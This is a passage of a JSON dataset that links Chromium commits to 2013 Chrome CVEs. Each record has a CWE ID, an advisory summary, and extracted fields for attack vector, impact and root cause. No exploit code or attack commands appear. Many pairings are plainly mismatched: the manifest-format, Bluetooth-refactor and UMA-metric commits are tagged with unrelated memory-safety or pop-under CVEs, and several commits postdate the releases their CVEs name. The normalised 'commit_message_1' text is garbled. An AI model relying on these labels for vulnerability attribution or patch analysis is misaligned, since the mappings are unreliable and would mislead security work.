Element#setAttributeNode()\n\nAttr objects can move across documents by setAttributeNode().\nSo It needs to reset ownerDocument through TreeScopeAdoptr::adoptIfNeeded().\n\nBUG=248950\nTEST=set-attribute-node-from-iframe.html\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/17583003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@152938 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in the DOM implementation in Google Chrome before 28.0.1500.95 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to improper tracking of which document owns an Attr object.","commit_message_1":"set <file> in element # setattributenode ( ) attr object can move across document by setattributenode ( )","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to improper tracking of which document owns an attr object","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error","Attack Type":"remote attacker"},{"commit_id":"2aa406a8b4577103e7b933c75ec0e372830f20fe","cve_id":"CVE-2013-2885","cwe_id":"CWE-399","commit_message":"<webview>: Update format for local file access in manifest.json\n\nThe new format is:\n\n\n\"webview\" : {\n   \"partitions\" : [\n      {\n           \"name\" : \"foo*\",\n           \"accessible_resources\" : [\"a.html\", \"b.html\"]\n      },\n      {\n           \"name\" : \"bar\",\n           \"accessible_resources\" : [\"a.html\", \"c.html\"]\n      }\n   ]\n}\n\nBUG=340291\n\nReview URL: https:\/\/codereview.chromium.org\/151923005\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@249640 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 28.0.1500.95 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to not properly considering focus during the processing of JavaScript events in the presence of a multiple-fields input type.","commit_message_1":"update format for local file access in <file> the new format is : `` webview '' : { `` partition '' : [ { `` name '' : `` foo * '' , `` accessible_resources '' : [ `` <file> '' , `` <file> '' ] } , { `` name '' : `` bar '' , `` accessible_resources '' : [ `` <file> '' , `` <file> '' ] } ] } bug=<number> review url : http : \/\/<file>","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to not properly considering focus during the processing of javascript events in the presence of a multiple - fields input type","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within input handling","Attack Type":"remote attacker"},{"commit_id":"79cfdeb5fbe79fa2604d37fba467f371cb436bc3","cve_id":"CVE-2013-2885","cwe_id":"CWE-399","commit_message":"Fix reentrance of BaseMultipleFieldsDateAndTimeInputType::destroyShadowSubtree.\n\ndestroyShadowSubtree could dispatch 'blur' event unexpectedly because\nelement()->focused() had incorrect information. We make sure it has\ncorrect information by checking if the UA shadow root contains the\nfocused element.\n\nBUG=257353\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/19067004\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@154086 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in Google Chrome before 28.0.1500.95 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to not properly considering focus during the processing of JavaScript events in the presence of a multiple-fields input type.","commit_message_1":"destroyshadowsubtree could dispatch 'blur ' event unexpectedly because element ( ) - > focused ( ) had incorrect information","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to not properly considering focus during the processing of javascript events in the presence of a multiple - fields input type","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within input handling","Attack Type":"remote attacker"},{"commit_id":"d358f57009b85fb7440208afa5ba87636b491889","cve_id":"CVE-2013-2867","cwe_id":null,"commit_message":"Refactor to support default Bluetooth pairing delegate\n\nIn order to support a default pairing delegate we need to move the agent\nservice provider delegate implementation from BluetoothDevice to\nBluetoothAdapter while retaining the existing API.\n\nBUG=338492\nTEST=device_unittests, unit_tests, browser_tests\n\nReview URL: https:\/\/codereview.chromium.org\/148293003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@252216 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 28.0.1500.71 does not properly prevent pop-under windows, which allows remote attackers to have an unspecified impact via a crafted web site.","commit_message_1":"refactor to support default bluetooth pairing delegate in order to support a default pairing delegate we need to move the agent service provider delegate implementation from bluetoothdevice to bluetoothadapter while retaining the existing api","Vulnerability Type":"unspecified","Attack Vector":"via a crafted web site","Impact":"have an unspecified impact","Root Cause":"does not properly prevent pop - under windows","Attack Type":"remote attacker"},{"commit_id":"afbc71b7a78ac99810a6b22b2b0a2e85dde18794","cve_id":"CVE-2013-2879","cwe_id":"CWE-200","commit_message":"Display confirmation dialog for untrusted signins\n\nBUG=252062\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/17482002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@208520 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 28.0.1500.71 does not properly determine the circumstances in which a renderer process can be considered a trusted process for sign-in and subsequent sync operations, which makes it easier for remote attackers to conduct phishing attacks via a crafted web site.","commit_message_1":"display confirmation dialog for untrusted signins bug=<number> review url : http : \/\/<file>","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted web site","Impact":"conduct phishing attacks","Root Cause":"does not properly determine the circumstances","Attack Type":"remote attacker"},{"commit_id":"8c95ab0b50f8a257514f9647929267e62b1e611d","cve_id":"CVE-2013-2868","cwe_id":null,"commit_message":"Fix syncing of NPAPI plugins.\n\nThis fix adds a check for |plugin| permission\nwhile syncing NPAPI plugins.\n\nBUG=252034\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/16816024\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@207830 0039d316-1c4b-4281-b951-d872f2087c98","summary":"common\/extensions\/sync_helper.cc in Google Chrome before 28.0.1500.71 proceeds with sync operations for NPAPI extensions without checking for a certain plugin permission setting, which might allow remote attackers to trigger unwanted extension changes via unspecified vectors.","commit_message_1":"fix syncing of npapi plugins","Vulnerability Type":"unspecified","Attack Vector":"via unspecified vectors","Impact":"trigger unwanted extension changes","Root Cause":"proceeds with sync operations for NPAPI extensions without checking for a certain plugin permission setting","Attack Type":"remote attacker"},{"commit_id":"ca8cc70b2de822b939f87effc7c2b83bac280a44","cve_id":"CVE-2013-2870","cwe_id":"CWE-399","commit_message":"Revert a workaround commit for a Use-After-Free crash.\n\nRevert a workaround commit r20158 for a Use-After-Free issue (http:\/\/crbug.com\/244746) because a cleaner CL r207218 is landed.\nURLRequestContext does not inherit SupportsWeakPtr now.\n\nR=mmenke\nBUG=244746\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/16870008\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@207811 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 28.0.1500.71 allows remote servers to execute arbitrary code via crafted response traffic after a URL request.","commit_message_1":"revert a workaround commit for a use-after-free crash","Vulnerability Type":"use - after - free","Attack Vector":"via crafted response traffic after a url request","Impact":"execute arbitrary code","Root Cause":"caused by a use-after-free error with network sockets","Attack Type":"remote attacker"},{"commit_id":"9c18dbcb79e5f700c453d1ac01fb6d8768e4844a","cve_id":"CVE-2013-2853","cwe_id":null,"commit_message":"net: don't process truncated headers on HTTPS connections.\n\nThis change causes us to not process any headers unless they are correctly\nterminated with a \\r\\n\\r\\n sequence.\n\nBUG=244260\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/15688012\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@202927 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The HTTPS implementation in Google Chrome before 28.0.1500.71 does not ensure that headers are terminated by rnrn (carriage return, newline, carriage return, newline), which allows man-in-the-middle attackers to have an unspecified impact via vectors that trigger header truncation.","commit_message_1":"do n't process truncated header on http connection","Vulnerability Type":"unspecified","Attack Vector":"via vectors that trigger header truncation","Impact":"have unspecified impact","Root Cause":"does not ensure that headers are terminated by rnrn","Attack Type":"remote attacker"},{"commit_id":"db97b49fdd856f33bd810db4564c6f2cc14be71a","cve_id":"CVE-2013-2871","cwe_id":"CWE-20","commit_message":"cc: Simplify raster task completion notification logic\n\n(Relanding after missing activation bug fixed in https:\/\/codereview.chromium.org\/131763003\/)\n\nPreviously the pixel buffer raster worker pool used a combination of\npolling and explicit notifications from the raster worker pool to decide\nwhen to tell the client about the completion of 1) all tasks or 2) the\nsubset of tasks required for activation. This patch simplifies the logic\nby only triggering the notification based on the OnRasterTasksFinished\nand OnRasterTasksRequiredForActivationFinished calls from the worker\npool.\n\nBUG=307841,331534\n\nReview URL: https:\/\/codereview.chromium.org\/99873007\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@243991 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 28.0.1500.71 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to the handling of input.","commit_message_1":"simplify raster task completion notification logic ( relanding after missing activation bug fixed in http : \/\/<file>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via vectors related to the handling of input","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error","Attack Type":"remote attacker"},{"commit_id":"bb9cfb0aba25f4b13e57bdd4a9fac80ba071e7b9","cve_id":"CVE-2013-2871","cwe_id":"CWE-20","commit_message":"Setting input.x-webkit-speech should not cause focus change\n\nIn r150866, we introduced element()->focus() in destroyShadowSubtree()\nto retain focus on <input> when its type attribute gets changed.\nBut when x-webkit-speech attribute is changed, the element is detached\nbefore calling destroyShadowSubtree() and element()->focus() failed\nThis patch moves detach() after destroyShadowSubtree() to fix the\nproblem.\n\nBUG=243818\nTEST=fast\/forms\/input-type-change-focusout.html\nNOTRY=true\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/16084005\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@151444 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in Google Chrome before 28.0.1500.71 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to the handling of input.","commit_message_1":"setting <file>-webkit-speech should not cause focus change in r150866 , we introduced element ( ) - > focus ( ) in destroyshadowsubtree ( ) to retain focus on < input > when it type attribute get changed","Vulnerability Type":"Improper Input Validation","Attack Vector":"via vectors related to the handling of input","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error","Attack Type":"remote attacker"},{"commit_id":"370bd9b522d2ccd4a3113d6c93d30cdf8ca502ef","cve_id":"CVE-2013-2873","cwe_id":"CWE-416","commit_message":"Protect WebURLLoaderImpl::Context while receiving responses.\n\nA client's didReceiveResponse can cancel a request; by protecting the\nContext we avoid a use after free in this case.\n\nInterestingly, we really had very good warning about this problem, see \nhttps:\/\/codereview.chromium.org\/11900002\/ back in January.\n\nR=darin\nBUG=241139\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/15738007\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@202821 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 28.0.1500.71 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors involving a 404 HTTP status code during the loading of resources.","commit_message_1":"while receiving response","Vulnerability Type":"Use After Free","Attack Vector":"via vectors involving a 404 http status code during the loading of resources","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error","Attack Type":"remote attacker"},{"commit_id":"c0da7c1c6e9ffe5006e146b6426f987238d4bf2e","cve_id":"CVE-2013-2874","cwe_id":"CWE-264","commit_message":"DevTools: handle devtools renderer unresponsiveness during beforeunload event interception\n\nThis patch fixes the crash which happenes under the following conditions:\n1. DevTools window is in undocked state\n2. DevTools renderer is unresponsive\n3. User attempts to close inspected page\n\nBUG=322380\n\nReview URL: https:\/\/codereview.chromium.org\/84883002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@237611 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 28.0.1500.71 on Windows, when an Nvidia GPU is used, allows remote attackers to bypass intended restrictions on access to screen data via vectors involving IPC transmission of GL textures.","commit_message_1":"handle devtools renderer unresponsiveness during beforeunload event interception this patch fix the crash which happenes under the following condition : <number>","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via vectors involving ipc transmission of gl textures","Impact":"bypass intended restrictions on access to screen data","Root Cause":"caused by a screen data leak with GL textures","Attack Type":"remote attacker"},{"commit_id":"016da29386308754274675e65fdb73cf9d59dc2d","cve_id":"CVE-2013-2876","cwe_id":"CWE-264","commit_message":"Don't allow extensions to take screenshots of interstitial pages. Branched from\nhttps:\/\/codereview.chromium.org\/14885004\/ which is trying to test it.\n\nBUG=229504\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/14954004\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@198297 0039d316-1c4b-4281-b951-d872f2087c98","summary":"browser\/extensions\/api\/tabs\/tabs_api.cc in Google Chrome before 28.0.1500.71 does not properly enforce restrictions on the capture of screenshots by extensions, which allows remote attackers to obtain sensitive information about the content of a previous page via vectors involving an interstitial page.","commit_message_1":"do n't allow extension to take screenshots of interstitial page","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via vectors involving an interstitial page","Impact":"obtain sensitive information about the content of a previous page","Root Cause":"does not properly enforce restrictions on the capture of screenshots by extensions","Attack Type":"remote attacker"},{"commit_id":"d0947db40187f4708c58e64cbd6013faf9eddeed","cve_id":"CVE-2013-2877","cwe_id":"CWE-119","commit_message":"libxml: XML_PARSER_EOF checks from upstream\n\nBUG=229019\nTBR=cpu\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/14053009\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@196804 0039d316-1c4b-4281-b951-d872f2087c98","summary":"parser.c in libxml2 before 2.9.0, as used in Google Chrome before 28.0.1500.71 and other products, allows remote attackers to cause a denial of service (out-of-bounds read) via a document that ends abruptly, related to the lack of certain checks for the XML_PARSER_EOF state.","commit_message_1":"xml_parser_eof check from upstream bug=<number> tb review url : http : \/\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"via a document that ends abruptly , related to the lack of certain checks for the xml _ parser _ eof state","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"09fbb829eab7ee25e90bb4e9c2f4973c6c62d0f3","cve_id":"CVE-2013-2878","cwe_id":"CWE-119","commit_message":"Upgrade a TextIterator ASSERT to a RELEASE_ASSERT as a defensive measure.\n\nBUG=156930,177197\nR=inferno@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/15057010\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@150123 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Google Chrome before 28.0.1500.71 allows remote attackers to cause a denial of service (out-of-bounds read) via vectors related to the handling of text.","commit_message_1":"upgrade a textiterator assert to a release_assert a a defensive measure","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors related to the handling of text","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"69827e08e9e0a30ce452589705d7336edaffd490","cve_id":"CVE-2013-2866","cwe_id":"CWE-264","commit_message":"Make the content setting for webcam\/mic sticky for Pepper requests.\n\nThis makes the content setting sticky for webcam\/mic requests from Pepper from non-https origins.\n\nBUG=249335\nR=xians@chromium.org, yzshen@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/17060006\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@206479 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The Flash plug-in in Google Chrome before 27.0.1453.116, as used on Google Chrome OS before 27.0.1453.116 and separately, does not properly determine whether a user wishes to permit camera or microphone access by a Flash application, which allows remote attackers to obtain sensitive information from a machine's physical environment via a clickjacking attack, as demonstrated by an attack using a crafted Cascading Style Sheets (CSS) opacity property.","commit_message_1":"make the content setting for webcam\/mic sticky for pepper request","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a clickjacking attack , as demonstrated by an attack using a crafted cascading style sheets ( css ) opacity property","Impact":"obtain sensitive information from a machine ' s physical environment","Root Cause":"does not properly determine whether a user wishes to permit camera or microphone access by a flash application","Attack Type":"remote attacker"},{"commit_id":"6f62e3b41fe9ef708aa8c990dd814ae91d68f2f4","cve_id":"CVE-2013-2854","cwe_id":null,"commit_message":"GetFileHandleForProcess should check for INVALID_HANDLE_VALUE\n\nBUG=243339\nR=tsepez@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/16020004\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@202207 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 27.0.1453.110 on Windows provides an incorrect handle to a renderer process in unspecified circumstances, which allows remote attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"getfilehandleforprocess should check for invalid_handle_value bug=<number> review url : http : \/\/<file>","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"provides an incorrect handle to a renderer process","Attack Type":"remote attacker"},{"commit_id":"482ed745fb07a9642504fae676ab901ee79c73dc","cve_id":"CVE-2013-2855","cwe_id":"CWE-119","commit_message":"Add security comment for the InjectedScriptHost.\n\nBUG=242322\nR=yurys@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/15808005\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@151122 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"The Developer Tools API in Google Chrome before 27.0.1453.110 allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via unknown vectors.","commit_message_1":"add security comment for the injectedscripthost","Vulnerability Type":"buffer overflow","Attack Vector":"via unknown vectors","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by an error within the Developer Tools API","Attack Type":"remote attacker"},{"commit_id":"e68fafe04d29810cebe8d25554863b0cae4c1356","cve_id":"CVE-2013-2856","cwe_id":"CWE-416","commit_message":"Map posix error codes in bind better, and fix one windows mapping.\n\n\nr=wtc\nBUG=330233\n\nReview URL: https:\/\/codereview.chromium.org\/101193008\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@242224 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 27.0.1453.110 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to the handling of input.","commit_message_1":"map posix error code in bind better , and fix one window mapping","Vulnerability Type":"Use After Free","Attack Vector":"via vectors related to the handling of input","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an unspecified use-after free error","Attack Type":"remote attacker"},{"commit_id":"7d085fbb43b21e959900b94f191588fd10546a94","cve_id":"CVE-2013-2857","cwe_id":"CWE-416","commit_message":"Error event was fired synchronously blowing away the input element from underneath. Remove the FIXME and fire it asynchronously using errorEventSender().\n\nBUG=240124\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/14741011\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@150232 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in Google Chrome before 27.0.1453.110 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to the handling of images.","commit_message_1":"error event wa fired synchronously blowing away the input element from underneath","Vulnerability Type":"Use After Free","Attack Vector":"via vectors related to the handling of images","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an unspecified use-after free error","Attack Type":"remote attacker"},{"commit_id":"828eab2216a765dea92575c290421c115b8ad028","cve_id":"CVE-2013-2858","cwe_id":"CWE-416","commit_message":"Added daily UMA for non-data-reduction-proxy data usage when the proxy is enabled.\n\nBUG=325325\n\nReview URL: https:\/\/codereview.chromium.org\/106113002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@239897 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in the HTML5 Audio implementation in Google Chrome before 27.0.1453.110 allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.","commit_message_1":"added daily uma for non-data-reduction-proxy data usage when the proxy is enabled","Vulnerability Type":"Use After Free","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after free error","Attack Type":"remote attacker"},{"commit_id":"508b89a64ab700aa09f21fc666a5588b47360eab","cve_id":"CVE-2013-2861","cwe_id":"CWE-399","commit_message":"Upgrade old app host to new app launcher on startup\n\nThis patch is a continuation of https:\/\/codereview.chromium.org\/16805002\/.\n\nBUG=248825\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/17022015\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@209604 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in the SVG implementation in Google Chrome before 27.0.1453.110 allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.","commit_message_1":"upgrade old app host to new app launcher on startup this patch is a continuation of http : \/\/<file>","Vulnerability Type":"use - after - free","Attack Vector":"using unknown attack vectors","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after free error","Attack Type":"remote attacker"},{"commit_id":"a3b76c8c13ea6b228122440f48c61b66d20443dd","cve_id":"CVE-2013-2862","cwe_id":"CWE-119","commit_message":"Fix crash in CreateAuthenticatorFactory().\n\nCreateAuthenticatorFactory() is called asynchronously, but it didn't handle\nthe case when it's called after host object is destroyed.\n\nBUG=150644\n\nReview URL: https:\/\/codereview.chromium.org\/11090036\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@161077 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Skia, as used in Google Chrome before 27.0.1453.110, does not properly handle GPU acceleration, which allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via unknown vectors.","commit_message_1":"fix crash in createauthenticatorfactory ( )","Vulnerability Type":"buffer overflow","Attack Vector":"via unknown vectors","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"does not properly handle gpu acceleration","Attack Type":"remote attacker"},{"commit_id":"be90ba35ee62e29d5440124dd11068a3e741ba5f","cve_id":"CVE-2013-2863","cwe_id":"CWE-119","commit_message":"Don't call SSL read\/write callbacks after an SSL socket is deleted\n\nBUG=232633\nR=wtc\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/14981005\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@199806 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 27.0.1453.110 does not properly handle SSL sockets, which allows remote attackers to execute arbitrary code or cause a denial of service (memory corruption) via unspecified vectors.","commit_message_1":"do n't call ssl read\/write callback after an ssl socket is deleted bug=<number> review url : http : \/\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"via unspecified vectors","Impact":"execute arbitrary code or cause a denial of service ( memory corruption )","Root Cause":"does not properly handle ssl sockets","Attack Type":"remote attacker"},{"commit_id":"0f05aa7e29cf814a204830c82ba2619f9c636894","cve_id":"CVE-2013-0879","cwe_id":"CWE-119","commit_message":"DIAL (Discovery and Launch protocol) extension API skeleton.\n\nThis implements the skeleton for a new Chrome extension API for local device discovery. The API will first be restricted to whitelisted extensions only. The API will allow extensions to receive events from a DIAL service running within Chrome which notifies of devices being discovered on the local network.\n\nSpec available here:\nhttps:\/\/docs.google.com\/a\/google.com\/document\/d\/14FI-VKWrsMG7pIy3trgM3ybnKS-o5TULkt8itiBNXlQ\/edit\n\nBUG=163288\nTBR=ben@chromium.org\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/11444020\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@172243 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 25.0.1364.97 on Windows and Linux, and before 25.0.1364.99 on Mac OS X, does not properly implement web audio nodes, which allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via unknown vectors.","commit_message_1":"dial ( discovery and launch protocol ) extension api skeleton","Vulnerability Type":"buffer overflow","Attack Vector":"via unknown vectors","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"does not properly implement web audio nodes","Attack Type":"remote attacker"},{"commit_id":"7df06970ff05d4b412534f6deea89c9b9ac4be67","cve_id":"CVE-2013-0880","cwe_id":"CWE-399","commit_message":"Add permission checks for PPB_Buffer.\nBUG=116317\nTEST=browser_tests\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/11446075\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@171951 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 25.0.1364.97 on Windows and Linux, and before 25.0.1364.99 on Mac OS X, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to databases.","commit_message_1":"add permission check for ppb_buffer","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to databases","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error","Attack Type":"remote attacker"},{"commit_id":"634c5943f46abe8c6280079f6d394dfee08c3c8f","cve_id":"CVE-2013-0881","cwe_id":"CWE-20","commit_message":"Disable some more query compositingState asserts.\n\nThis gets the tests passing again on Mac. See the bug for the stacktrace.\nA future patch will need to actually fix the incorrect reading of\ncompositingState.\n\nBUG=343179\n\nReview URL: https:\/\/codereview.chromium.org\/162153002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@167069 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Google Chrome before 25.0.1364.97 on Windows and Linux, and before 25.0.1364.99 on Mac OS X, allows remote attackers to cause a denial of service (incorrect read operation) via crafted data in the Matroska container format.","commit_message_1":"disable some more query compositingstate asserts","Vulnerability Type":"Improper Input Validation","Attack Vector":"via crafted data in the matroska container format","Impact":"cause a denial of service ( incorrect read operation )","Root Cause":"caused by a bad read","Attack Type":"remote attacker"},{"commit_id":"25f9415f43d607d3d01f542f067e3cc471983e6b","cve_id":"CVE-2013-0882","cwe_id":"CWE-119","commit_message":"Add HTMLFormControlElement::supportsAutofocus to fix a FIXME comment.\n\nThis virtual function should return true if the form control can hanlde\n'autofocucs' attribute if it is specified.\n\nNote: HTMLInputElement::supportsAutofocus reuses InputType::isInteractiveContent\nbecause interactiveness is required for autofocus capability.\n\nBUG=none\nTEST=none; no behavior changes.\n\nReview URL: https:\/\/codereview.chromium.org\/143343003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@165432 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Google Chrome before 25.0.1364.97 on Windows and Linux, and before 25.0.1364.99 on Mac OS X, allows remote attackers to cause a denial of service (incorrect memory access) or possibly have unspecified other impact via a large number of SVG parameters.","commit_message_1":"to fix a fixme comment","Vulnerability Type":"buffer overflow","Attack Vector":"via a large number of svg parameters","Impact":"cause a denial of service ( incorrect memory access ) or possibly have unspecified other impact","Root Cause":"caused by a bad memory access with excessive SVG parameters","Attack Type":"remote attacker"},{"commit_id":"4c39b8e5670c4a0f2bb06008502ebb0c4fe322e0","cve_id":"CVE-2013-0884","cwe_id":null,"commit_message":"[4\/4] Process clearBrowserCahce\/cookies commands in browser.\n\nBUG=366585\n\nReview URL: https:\/\/codereview.chromium.org\/251183005\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@172984 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Google Chrome before 25.0.1364.97 on Windows and Linux, and before 25.0.1364.99 on Mac OS X, does not properly load Native Client (aka NaCl) code, which has unspecified impact and attack vectors.","commit_message_1":"process clearbrowsercahce\/cookies command in browser","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"have unspecified impact","Root Cause":"does not properly load native client ( aka nacl ) code","Attack Type":"remote attacker"},{"commit_id":"f335421145bb7f82c60fb9d61babcd6ce2e4b21e","cve_id":"CVE-2013-0885","cwe_id":"CWE-264","commit_message":"Tighten restrictions on hosted apps calling extension APIs\n\nOnly allow component apps to make any API calls, and for them only allow the namespaces they explicitly have permission for (plus chrome.test - I need to see if I can rework some WebStore tests to remove even this). \n\nBUG=172369\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/12095095\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@180426 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 25.0.1364.97 on Windows and Linux, and before 25.0.1364.99 on Mac OS X, does not properly restrict API privileges during interaction with the Chrome Web Store, which has unspecified impact and attack vectors.","commit_message_1":"tighten restriction on hosted apps calling extension apis only allow component apps to make any api call , and for them only allow the namespaces they explicitly have permission for ( plus <file> - i need to see if i can rework some webstore test to remove even this )","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"has unspecified attack vectors","Impact":"has unspecified impact","Root Cause":"does not properly restrict api privileges during interaction with the chrome web store","Attack Type":"remote attacker"},{"commit_id":"18d67244984a574ba2dd8779faabc0e3e34f4b76","cve_id":"CVE-2013-0886","cwe_id":null,"commit_message":"Implement TextureImageTransportSurface using texture mailbox\n\nThis has a couple of advantages:\n- allow tearing down and recreating the UI parent context without\nlosing the renderer contexts\n- do not require a context to be able to generate textures when\ncreating the GLSurfaceHandle\n- clearer ownership semantics that potentially allows for more\nrobust and easier lost context 